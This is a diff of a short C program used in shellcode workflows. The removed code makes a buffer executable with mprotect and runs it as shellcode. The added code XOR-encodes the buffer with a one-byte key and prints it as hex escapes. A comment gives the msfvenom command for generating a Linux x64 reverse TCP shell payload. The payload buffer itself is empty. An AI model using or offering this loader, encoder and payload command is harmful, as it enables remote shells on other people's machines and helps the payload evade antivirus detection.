@@ -1,25 +1,19 @@
-#define _GNU_SOURCE
-#include <sys/mman.h> // for mprotect 
-#include <stdlib.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
-//'linux/x64/shell_reverse_tcp' payload
+// msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f c
 unsigned char buf[] = ;
 
 int main (int argc, char **argv) 
 {
-        intptr_t pagesize = sysconf(_SC_PAGESIZE);
-        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
-                pagesize, PROT_READ|PROT_EXEC))
-        {
-                perror("mprotect");
-                return -1;
-        }
-        	
-	int (*ret)() = (int(*)())buf;
-  	ret();
-  
-        return 0;
+	char xor_key = 'J';
+	int payload_length = (int) sizeof(buf);
+
+	for (int i=0; i<payload_length; i++)
+	{
+		printf("\\x%02X",buf[i]^xor_key);
+	}
+
+	return 0;
 }
